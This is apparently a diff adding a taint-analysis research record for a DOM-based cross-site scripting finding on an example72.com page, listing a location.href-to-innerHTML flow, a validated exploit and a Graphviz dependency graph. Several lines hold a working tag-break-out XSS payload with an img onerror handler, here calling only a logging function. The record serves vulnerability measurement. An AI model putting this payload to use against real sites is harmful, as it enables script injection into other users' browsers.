@@ -1,0 +1,115 @@
+// Finding: 8ed020f3-b31d-42c6-9e46-4f49f855cf8a
+// Finding.url: https://www.example72.com/resources/community-banking/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('a28b805f455f4e53837e0c48fef08585')><!--/*
+// Finding.parentloc: https://www.example72.com/resources/community-banking/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('a28b805f455f4e53837e0c48fef08585')><!--/*
+// Finding.domain: www.example72.com
+// Finding.base_domain: example72.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 1
+// Sanitizer.name: 
+// Sanitizer.location: https://www.example72.com/resources/community-banking/##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('a28b805f455f4e53837e0c48fef08585')><!--/* - <anonymous>:1065:15
+// Finding.begin: 166
+// Finding.end: 173
+// Finding.original_uuid: 176b0cc7-915e-4f3f-bcea-fc675c221cd9
+// Finding.TwentyFiveMillionFlowsId: -542993026
+// Finding.script: https://www.example72.com/assets/javascript/jquery-3.4.1.min.js
+// Finding.line: 2
+// Exploit.uuid: a28b805f-455f-4e53-837e-0c48fef08585
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: aria-label
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 21
+// Exploit.end_taint_url: 22
+// Exploit.replace_begin_url: 49
+// Exploit.replace_end_url: 49
+// Exploit.replace_begin_param: 86
+// Exploit.replace_end_param: 86
+// Issues.LargestEncodeAttrStringChain: 0
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: true
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1760033389
+// DepGraph.sanitizer_hash: -948096438
+// Removed LR concats 
+// Removed LR concats 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="str_replace_once"];
+n2 [shape=box, label="RegExp: /(\?.*)$/"];
+n3 [shape=box, label="Lit: "];
+n4 [shape=box, label="Var: x"];
+n5 [shape=ellipse, label="split"];
+n6 [shape=box, label="Lit: /"];
+n7 [shape=box, label="Var: x"];
+n8 [shape=ellipse, label="strtolower"];
+n9 [shape=box, label="Var: x"];
+n10 [shape=ellipse, label="substr"];
+n11 [shape=box, label="Var: x"];
+n12 [shape=box, label="Lit: 1"];
+n13 [shape=ellipse, label="str_replace_once"];
+n14 [shape=box, label="RegExp: /\.(htm[l]?|asp[x]?|php|jsp)$/"];
+n15 [shape=box, label="Lit:  "];
+n16 [shape=box, label="Var: x"];
+n17 [shape=ellipse, label="str_replace_once"];
+n18 [shape=box, label="RegExp: /\.(htm[l]?|asp[x]?|php|jsp)$/"];
+n19 [shape=box, label="Lit:  "];
+n20 [shape=box, label="Var: x"];
+n21 [shape=ellipse, label="preg_replace"];
+n22 [shape=box, label="RegExp: /[-]/"];
+n23 [shape=box, label="Lit:  "];
+n24 [shape=box, label="Var: x"];
+n25 [shape=ellipse, label="."];
+n26 [shape=box, label="Lit: </a></li>"];
+n27 [shape=box, label="Var: x"];
+n28 [shape=doubleoctagon, label="Return: x"];
+n4 -> n0;
+n1 -> n2;
+n1 -> n3;
+n1 -> n4;
+n7 -> n1;
+n5 -> n6;
+n5 -> n7;
+n9 -> n5;
+n8 -> n9;
+n11 -> n8;
+n10 -> n11;
+n10 -> n12;
+n16 -> n10;
+n13 -> n14;
+n13 -> n15;
+n13 -> n16;
+n20 -> n13;
+n17 -> n18;
+n17 -> n19;
+n17 -> n20;
+n24 -> n17;
+n21 -> n22;
+n21 -> n23;
+n21 -> n24;
+n25 -> n21;
+n25 -> n26;
+n27 -> n25;
+n28 -> n27;
+}
